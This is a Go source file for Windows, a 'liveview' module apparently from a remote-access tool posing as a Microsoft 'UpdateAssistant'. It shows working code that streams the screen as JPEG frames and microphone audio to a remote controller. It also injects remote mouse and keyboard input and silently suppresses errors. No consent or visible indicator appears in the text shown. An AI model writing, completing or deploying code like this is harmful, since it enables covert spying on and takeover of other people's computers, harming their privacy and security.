//go:build windows

package liveview

import (
	"bytes"
	"encoding/json"
	"image"
	"image/jpeg"
	"sync"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

type lvSession struct {
	stopCh chan struct{}
	wg     sync.WaitGroup
}

var (
	mu        sync.Mutex
	sessions  = map[string]*lvSession{}
	origW     int
	origH     int
	capW      int
	capH      int
	bufPool   = sync.Pool{New: func() interface{} { return new(bytes.Buffer) }}
	slicePool = sync.Pool{New: func() interface{} { b := make([]byte, 0, 32768); return &b }}
)

func bgraToRGBA(src, dst []byte, w, h int) {
	n := w * h * 4
	for i := 0; i < n; i += 4 {
		dst[i] = src[i+2]
		dst[i+1] = src[i+1]
		dst[i+2] = src[i]
		dst[i+3] = 255
	}
}

func Start(client *transport.Client, sessID string) {
	if !sysutil.LvLoad() {
		return
	}

	mu.Lock()
	if old, ok := sessions[sessID]; ok {
		close(old.stopCh)
		delete(sessions, sessID)
		mu.Unlock()
		old.wg.Wait()
		mu.Lock()
	}
	mu.Unlock()

	w, h, oW, oH := sysutil.LvCaptureInfo()
	if w == 0 || h == 0 || oW == 0 || oH == 0 {
		logger.Info("[lv] capture_info returned zero dimensions")
		return
	}
	mu.Lock()
	capW, capH = w, h
	origW, origH = oW, oH
	mu.Unlock()

	s := &lvSession{stopCh: make(chan struct{})}
	mu.Lock()
	sessions[sessID] = s
	mu.Unlock()

	outbound := make(chan outPkt, 8)

	s.wg.Add(3)

	go func() {
		defer s.wg.Done()
		defer func() { recover() }()
		for {
			select {
			case <-s.stopCh:
				return
			case pkt := <-outbound:
				client.SendBinary(pkt.msgType, pkt.data)
				if pkt.pooled != nil {
					slicePool.Put(pkt.pooled)
				}
			}
		}
	}()

	go func() {
		defer s.wg.Done()
		defer func() { recover() }()
		startMicPoll(outbound, s.stopCh)
	}()

	go func() {
		defer s.wg.Done()
		defer func() { recover() }()
		ticker := time.NewTicker(33 * time.Millisecond)
		defer ticker.Stop()
		captureBuf := make([]byte, config.SsCap)
		rgbaBuf := make([]byte, w*h*4)
		frameImg := &image.RGBA{Pix: rgbaBuf, Stride: w * 4, Rect: image.Rect(0, 0, w, h)}
		for {
			select {
			case <-s.stopCh:
				return
			case <-ticker.C:
				n := sysutil.LvCapture(captureBuf)
				if n <= 0 {
					continue
				}
				bgraToRGBA(captureBuf[:n], rgbaBuf, w, h)

				jb := bufPool.Get().(*bytes.Buffer)
				jb.Reset()
				if jpeg.Encode(jb, frameImg, &jpeg.Options{Quality: 30}) != nil {
					bufPool.Put(jb)
					continue
				}
				frameData := jb.Bytes()
				bufPool.Put(jb)

				data := slicePool.Get().(*[]byte)
				*data = (*data)[:0]
				*data = append(*data, frameData...)
				select {
				case outbound <- outPkt{msgType: "liveview_frame", data: *data, pooled: data}:
				default:
					slicePool.Put(data)
				}
			}
		}
	}()
}

func StopSession(sessID string) {
	mu.Lock()
	s := sessions[sessID]
	if s != nil {
		delete(sessions, sessID)
		close(s.stopCh)
	}
	noSessions := len(sessions) == 0
	mu.Unlock()

	if s == nil {
		return
	}

	if noSessions {
		StopMic()
	}

	done := make(chan struct{})
	go func() { s.wg.Wait(); close(done) }()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		logger.Info("[lv] stop timed out sess=%s", sessID)
	}

	if noSessions {
		sysutil.LvCaptureReset()
		sysutil.LvUnload()
		sysutil.MicUnload()
		logger.Info("[lv] all sessions done, DLLs unloaded")
	}
}

func Stop() {
	mu.Lock()
	ids := make([]string, 0, len(sessions))
	for id := range sessions {
		ids = append(ids, id)
	}
	mu.Unlock()
	for _, id := range ids {
		StopSession(id)
	}
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "liveview_start":
		go Start(client, "")
	case "liveview_stop":
		go Stop()
	case "liveview_input":
		go HandleInput(payload)
	}
}

var lastInputHash uint64
var lastInputTime int64

func inputHash(m struct {
	Type   string `json:"type"`
	X      int    `json:"x"`
	Y      int    `json:"y"`
	Button int    `json:"button"`
	Down   bool   `json:"down"`
	Delta  int    `json:"delta"`
	VK     int    `json:"vk"`
}) uint64 {
	h := uint64(m.X)*73856093 ^ uint64(m.Y)*19349663 ^ uint64(m.Button)*83492791 ^ uint64(m.Delta)*4021841 ^ uint64(m.VK)*14778391
	if m.Down {
		h ^= 1
	}
	switch m.Type {
	case "move":
		h ^= 2
	case "click":
		h ^= 4
	case "scroll":
		h ^= 8
	case "key":
		h ^= 16
	}
	return h
}

func HandleInput(payload json.RawMessage) {
	var m struct {
		Type   string `json:"type"`
		X      int    `json:"x"`
		Y      int    `json:"y"`
		Button int    `json:"button"`
		Down   bool   `json:"down"`
		Delta  int    `json:"delta"`
		VK     int    `json:"vk"`
	}
	if json.Unmarshal(payload, &m) != nil {
		return
	}
	now := time.Now().UnixMilli()
	h := inputHash(m)
	if h == lastInputHash && now-lastInputTime < 50 {
		return
	}
	lastInputHash = h
	lastInputTime = now

	mu.Lock()
	sW, sH, cW, cH := origW, origH, capW, capH
	mu.Unlock()

	scaleX := float64(sW) / float64(cW)
	scaleY := float64(sH) / float64(cH)
	sx := int(float64(m.X) * scaleX)
	sy := int(float64(m.Y) * scaleY)

	switch m.Type {
	case "move":
		sysutil.LvMouseMove(sx, sy)
	case "click":
		sysutil.LvMouseClick(sx, sy, m.Button, m.Down)
	case "scroll":
		sysutil.LvMouseScroll(sx, sy, m.Delta)
	case "key":
		sysutil.LvKeyEvent(m.VK, m.Down)
	}
}
